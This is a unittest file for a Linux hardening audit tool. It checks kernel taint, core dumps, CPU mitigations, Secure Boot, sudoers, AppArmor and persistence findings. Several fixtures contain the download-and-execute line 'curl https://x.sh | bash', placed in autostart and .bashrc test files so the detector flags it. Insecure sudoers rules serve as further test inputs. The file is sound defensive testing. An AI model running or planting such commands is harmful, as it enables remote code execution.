"""Tests for the read-only hardening audit (kernel, hardware, rules).

Every check must be safe: an unreadable file is never an exception,
only an INFO "no verificable" finding.
"""

import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from mintguard.checks import hardening
from mintguard.checks.hardening import (
    check_apparmor,
    check_core_dumps,
    check_cpu_mitigations,
    check_iommu,
    check_kernel_errors,
    check_kernel_taint,
    check_persistence,
    check_secure_boot,
    check_sudoers,
    parse_apparmor_profiles,
    parse_core_limit,
    parse_desktop_exec,
    parse_kernel_errors,
    parse_sudoers_aliases,
    parse_sudoers_rules,
    parse_suspicious_commands,
    parse_tainted,
    parse_vulnerability_status,
)
from mintguard.core.distro import DistroInfo, PackageManager
from mintguard.core.prioritizer import Severidad

DISTRO = DistroInfo(
    distro_id="linuxmint",
    name="Linux Mint",
    version="22",
    package_manager=PackageManager("apt", "/usr/bin/apt"),
    has_systemd=True,
    mac_module="AppArmor",
    firewall_tool="UFW",
)


def _write(directory: Path, name: str, content: str) -> Path:
    path = directory / name
    path.write_text(content, encoding="utf-8")
    return path


class KernelTaintTests(unittest.TestCase):
    """A) /proc/sys/kernel/tainted."""

    def test_parse_tainted_values(self):
        self.assertEqual(parse_tainted("0"), (0, []))
        self.assertEqual(parse_tainted("1")[0], 1)
        self.assertEqual(parse_tainted("4096")[0], 4096)
        self.assertEqual(parse_tainted("8193")[0], 8193)
        # A live patch (bit 12) and a proprietary module (bit 0).
        value, reasons = parse_tainted("4097")
        self.assertEqual(value, 4097)
        self.assertEqual(len(reasons), 2)
        self.assertEqual(parse_tainted("nope"), (-1, []))

    def test_clean_kernel_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "tainted", "0\n")
            with mock.patch.object(hardening, "TAINTED_PATH", path):
                findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_tainted_kernel_is_media(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "tainted", "1\n")
            with mock.patch.object(hardening, "TAINTED_PATH", path):
                findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.MEDIA)
        self.assertIn("módulo propietario", findings[0].detail)

    def test_security_bit_is_alta(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "tainted", "8193\n")
            with mock.patch.object(hardening, "TAINTED_PATH", path):
                findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_missing_file_is_info_not_crash(self):
        with mock.patch.object(hardening, "TAINTED_PATH", Path("/no/existe/tainted")):
            findings = check_kernel_taint()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("no verificable", findings[0].title)


class CoreDumpTests(unittest.TestCase):
    """B) /proc/sys/kernel/core_pattern y el límite de /proc/self/limits."""

    LIMITS = "Limit  Soft Limit  Hard Limit  Units\nCore file size  0  unlimited  bytes\n"

    def test_parse_core_limit(self):
        self.assertEqual(parse_core_limit(self.LIMITS), 0)
        unlimited = "Core file size  unlimited  unlimited  bytes\n"
        self.assertEqual(parse_core_limit(unlimited), -1)
        self.assertIsNone(parse_core_limit("sin limites\n"))

    def _check(self, pattern: str, limits: str):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            pattern_path = _write(base, "core_pattern", pattern)
            limits_path = _write(base, "limits", limits)
            with (
                mock.patch.object(hardening, "CORE_PATTERN_PATH", pattern_path),
                mock.patch.object(hardening, "LIMITS_PATH", limits_path),
            ):
                return check_core_dumps()

    def test_pipe_pattern_goes_to_a_handler(self):
        findings = self._check("|/usr/lib/systemd/systemd-coredump %P\n", self.LIMITS)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("gestor", findings[0].title)

    def test_file_pattern_with_limit_zero_is_info(self):
        findings = self._check("core\n", self.LIMITS)
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_file_pattern_with_limit_is_alta(self):
        limits = "Core file size  1048576  unlimited  bytes\n"
        findings = self._check("core.%p\n", limits)
        self.assertEqual(findings[0].severity, Severidad.ALTA)
        self.assertIn("contraseñas", findings[0].detail)

    def test_unreadable_limits_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            pattern_path = _write(base, "core_pattern", "core\n")
            with (
                mock.patch.object(hardening, "CORE_PATTERN_PATH", pattern_path),
                mock.patch.object(hardening, "LIMITS_PATH", Path("/no/existe/limits")),
            ):
                findings = check_core_dumps()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class CpuMitigationTests(unittest.TestCase):
    """C) /sys/devices/system/cpu/vulnerabilities."""

    def test_parse_status(self):
        self.assertEqual(parse_vulnerability_status("Not affected"), "not-affected")
        self.assertEqual(parse_vulnerability_status("Mitigation: Enhanced IBRS"), "mitigated")
        self.assertEqual(parse_vulnerability_status("Vulnerable: eBPF"), "vulnerable")
        self.assertEqual(parse_vulnerability_status(""), "unknown")

    def test_vulnerable_cpu_is_alta(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            _write(base, "spectre_v2", "Vulnerable: eBPF: enabled with unprivileged bpf()\n")
            _write(base, "meltdown", "Not affected\n")
            with mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", base):
                findings = check_cpu_mitigations()
        self.assertEqual(findings[0].severity, Severidad.ALTA)
        self.assertIn("spectre_v2", findings[0].evidence)

    def test_mitigated_cpu_is_one_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            _write(base, "spectre_v2", "Mitigation: Enhanced IBRS\n")
            _write(base, "meltdown", "Not affected\n")
            with mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", base):
                findings = check_cpu_mitigations()
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("1 mitigación(es) activas", findings[0].detail)

    def test_missing_directory_is_info(self):
        with mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", Path("/no/existe")):
            findings = check_cpu_mitigations()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class IommuTests(unittest.TestCase):
    """D) /sys/class/iommu."""

    def test_missing_iommu_is_media(self):
        with mock.patch.object(hardening, "IOMMU_DIR", Path("/no/existe")):
            findings = check_iommu()
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_empty_iommu_is_media(self):
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(hardening, "IOMMU_DIR", Path(tmp)):
                findings = check_iommu()
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_active_iommu_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            (base / "IntelIOMMU").mkdir()
            with mock.patch.object(hardening, "IOMMU_DIR", base):
                findings = check_iommu()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class SecureBootTests(unittest.TestCase):
    """E) /sys/firmware/efi/efivars/SecureBoot-*."""

    def _efi(self, tmp: str, value: bytes | None):
        base = Path(tmp) / "efi"
        efivars = base / "efivars"
        efivars.mkdir(parents=True)
        if value is not None:
            (efivars / "SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c").write_bytes(value)
        return base

    def test_legacy_boot_is_info(self):
        with mock.patch.object(hardening, "EFI_DIR", Path("/no/existe")):
            findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("legacy", findings[0].detail)

    def test_enabled_secure_boot_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            efi = self._efi(tmp, b"\x01\x00\x00\x00" + b"\x01")
            with mock.patch.object(hardening, "EFI_DIR", efi):
                findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("activo", findings[0].title)

    def test_disabled_secure_boot_is_alta(self):
        with tempfile.TemporaryDirectory() as tmp:
            efi = self._efi(tmp, b"\x01\x00\x00\x00" + b"\x00")
            with mock.patch.object(hardening, "EFI_DIR", efi):
                findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_missing_variable_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            efi = self._efi(tmp, None)
            with mock.patch.object(hardening, "EFI_DIR", efi):
                findings = check_secure_boot()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class SudoersTests(unittest.TestCase):
    """F) /etc/sudoers y /etc/sudoers.d/."""

    def test_parse_nopasswd_all(self):
        rules = parse_sudoers_rules(["user ALL=(ALL) NOPASSWD: ALL"])
        self.assertEqual(rules[0][0], "nopasswd_all")

    def test_nopasswd_specific_command_is_not_a_finding(self):
        self.assertEqual(parse_sudoers_rules(["user ALL=(ALL) NOPASSWD: /usr/bin/foo"]), [])

    def test_parse_env_keep(self):
        rules = parse_sudoers_rules(["Defaults env_keep += \"LD_PRELOAD\""])
        self.assertEqual(rules[0][0], "env_keep")

    def test_parse_wildcard_editor(self):
        rules = parse_sudoers_rules(["user ALL=(ALL) /usr/bin/vim *"])
        self.assertEqual(rules[0][0], "wildcard")

    def test_commented_lines_are_ignored(self):
        self.assertEqual(parse_sudoers_rules(["# user ALL=(ALL) NOPASSWD: ALL"]), [])

    def test_parse_aliases(self):
        aliases = parse_sudoers_aliases(["User_Alias ADMINS = alice,bob"])
        self.assertEqual(aliases, ["ADMINS"])

    def _check(self, files: dict[str, str]):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            sudoers = _write(base, "sudoers", files.get("sudoers", ""))
            dropins = base / "sudoers.d"
            dropins.mkdir()
            for name, content in files.items():
                if name != "sudoers":
                    _write(dropins, name, content)
            with (
                mock.patch.object(hardening, "SUDOERS_PATH", sudoers),
                mock.patch.object(hardening, "SUDOERS_DIR", dropins),
            ):
                return check_sudoers()

    def test_nopasswd_all_is_critica(self):
        findings = self._check({"sudoers": "user ALL=(ALL) NOPASSWD: ALL\n"})
        self.assertEqual(findings[0].severity, Severidad.CRITICA)

    def test_wildcard_is_media(self):
        findings = self._check({"sudoers": "user ALL=(ALL) /usr/bin/vim *\n"})
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_clean_sudoers_is_info(self):
        findings = self._check({"sudoers": "user ALL=(ALL) /usr/bin/apt-get update\n"})
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_alias_rule_is_not_evaluated(self):
        content = "User_Alias ADMINS = alice\nADMINS ALL=(ALL) NOPASSWD: ALL\n"
        findings = self._check({"sudoers": content})
        titles = [f.title for f in findings]
        self.assertTrue(any("alias" in t for t in titles))
        self.assertFalse(any("NOPASSWD" in t for t in titles))

    def test_unreadable_sudoers_is_info(self):
        with (
            mock.patch.object(hardening, "SUDOERS_PATH", Path("/no/existe/sudoers")),
            mock.patch.object(hardening, "SUDOERS_DIR", Path("/no/existe/sudoers.d")),
        ):
            findings = check_sudoers()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class ApparmorTests(unittest.TestCase):
    """G) /sys/kernel/security/apparmor/profiles."""

    def test_parse_profiles(self):
        text = (
            "usr.sbin.sshd (enforce)\n"
            "/usr/bin/foo (complain)\n"
            "/usr/bin/bar (complain)\n"
        )
        enforce, complain, names = parse_apparmor_profiles(text)
        self.assertEqual(enforce, 1)
        self.assertEqual(complain, 2)
        self.assertEqual(names, ["/usr/bin/foo", "/usr/bin/bar"])

    def test_complain_profiles_are_baja(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "profiles", "/usr/bin/foo (complain)\n")
            with mock.patch.object(hardening, "APPARMOR_PROFILES_PATH", path):
                findings = check_apparmor()
        self.assertEqual(findings[0].severity, Severidad.BAJA)
        self.assertEqual(findings[0].evidence, ["/usr/bin/foo"])

    def test_enforce_only_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = _write(Path(tmp), "profiles", "usr.sbin.sshd (enforce)\n")
            with mock.patch.object(hardening, "APPARMOR_PROFILES_PATH", path):
                findings = check_apparmor()
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_missing_apparmor_is_info(self):
        with mock.patch.object(hardening, "APPARMOR_PROFILES_PATH", Path("/no/existe")):
            findings = check_apparmor()
        self.assertEqual(findings[0].severity, Severidad.INFO)


class PersistenceTests(unittest.TestCase):
    """H) Autoarranque, rc.local, crontab y ficheros de inicio."""

    def test_parse_desktop_exec(self):
        entries = parse_desktop_exec(["[Desktop Entry]", "Exec=guake", "Name=Terminal"])
        self.assertEqual(entries, ["guake"])

    def test_parse_suspicious_commands(self):
        lines = ["# comment", "curl https://x.sh | bash", "export PATH=/usr/bin"]
        self.assertEqual(parse_suspicious_commands(lines), ["curl https://x.sh | bash"])

    def _home(self, base: Path, files: dict[str, str]):
        for name, content in files.items():
            path = base / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
        return base

    def _check(self, files: dict[str, str]):
        with tempfile.TemporaryDirectory() as tmp:
            home = self._home(Path(tmp), files)
            with (
                mock.patch.object(Path, "home", staticmethod(lambda: home)),
                mock.patch.object(hardening, "resolve_binary", return_value=None),
            ):
                return check_persistence(DISTRO)

    def test_normal_autostart_is_info(self):
        desktop = "[Desktop Entry]\nExec=guake\n"
        findings = self._check({".config/autostart/guake.desktop": desktop})
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_autostart_with_download_and_execute_is_media(self):
        desktop = "[Desktop Entry]\nExec=sh -c 'curl https://x.sh | bash'\n"
        findings = self._check({".config/autostart/malo.desktop": desktop})
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_autostart_outside_system_paths_is_alta(self):
        desktop = "[Desktop Entry]\nExec=/home/usuario/.local/bin/cosa\n"
        findings = self._check({".config/autostart/propio.desktop": desktop})
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_shell_startup_with_download_is_media(self):
        findings = self._check({".bashrc": "curl https://x.sh | bash\n"})
        self.assertEqual(findings[0].severity, Severidad.MEDIA)

    def test_empty_rc_local_is_not_a_finding(self):
        with tempfile.TemporaryDirectory() as tmp:
            rc_local = _write(Path(tmp), "rc.local", "# nada que hacer\n")
            with (
                mock.patch.object(hardening, "rc_local", rc_local, create=True),
                mock.patch.object(Path, "home", staticmethod(lambda: Path(tmp))),
                mock.patch.object(hardening, "resolve_binary", return_value=None),
            ):
                findings = check_persistence(DISTRO)
        self.assertEqual(findings[0].severity, Severidad.INFO)


class KernelErrorTests(unittest.TestCase):
    """I) Errores del kernel (dmesg)."""

    def test_parse_kernel_errors(self):
        text = "Jan 1 00:00:00 kernel: BUG: unable to handle kernel\nJan 1 00:00:01 kernel: otra\n"
        errors = parse_kernel_errors(text)
        self.assertEqual(len(errors), 1)
        self.assertIn("BUG:", errors[0])

    def test_no_errors_is_info(self):
        with mock.patch.object(hardening, "run_command", return_value=None):
            with mock.patch.object(hardening, "_read_text", return_value=(None, "no existe")):
                findings = check_kernel_errors(DISTRO)
        self.assertEqual(findings[0].severity, Severidad.INFO)

    def test_errors_are_reported_with_the_distro_command(self):
        result = mock.Mock(returncode=0, stdout="kernel: Oops: 1: fatal error\n", stderr="")
        with mock.patch.object(hardening, "run_command", return_value=result):
            findings = check_kernel_errors(DISTRO)
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("ubuntu-bug", findings[0].suggestion)


class FailSafeTests(unittest.TestCase):
    """A path that does not exist must never be an exception."""

    def test_every_check_survives_missing_files(self):
        missing = Path("/no/existe/nada")
        patches = [
            mock.patch.object(hardening, "TAINTED_PATH", missing),
            mock.patch.object(hardening, "CORE_PATTERN_PATH", missing),
            mock.patch.object(hardening, "LIMITS_PATH", missing),
            mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", missing),
            mock.patch.object(hardening, "IOMMU_DIR", missing),
            mock.patch.object(hardening, "EFI_DIR", missing),
            mock.patch.object(hardening, "SUDOERS_PATH", missing),
            mock.patch.object(hardening, "SUDOERS_DIR", missing),
            mock.patch.object(hardening, "APPARMOR_PROFILES_PATH", missing),
            mock.patch.object(hardening, "resolve_binary", return_value=None),
        ]
        for patch in patches:
            patch.start()
        try:
            for check in (
                check_kernel_taint,
                check_core_dumps,
                check_cpu_mitigations,
                check_iommu,
                check_secure_boot,
                check_sudoers,
                check_apparmor,
            ):
                with self.subTest(check=check.__name__):
                    findings = check()
                    self.assertIsInstance(findings, list)
            findings = check_persistence(DISTRO)
            self.assertIsInstance(findings, list)
        finally:
            for patch in patches:
                patch.stop()


class PerformanceTests(unittest.TestCase):
    """Each check must stay well under 50 ms on the target hardware.

    The two checks that shell out (crontab, dmesg) are measured with
    the runner stubbed: the fork itself is the cost, and it is
    documented separately (AGENTS.md).
    """

    def _time(self, check) -> float:
        start = time.perf_counter()
        check()
        return (time.perf_counter() - start) * 1000

    def test_checks_are_fast(self):
        checks = [
            check_kernel_taint,
            check_core_dumps,
            check_cpu_mitigations,
            check_iommu,
            check_secure_boot,
            check_sudoers,
            check_apparmor,
        ]
        for check in checks:
            with self.subTest(check=check.__name__):
                self.assertLess(self._time(check), 50)

    def test_persistence_is_fast_without_subprocesses(self):
        with mock.patch.object(hardening, "resolve_binary", return_value=None):
            self.assertLess(self._time(lambda: check_persistence(DISTRO)), 50)


if __name__ == "__main__":
    unittest.main()
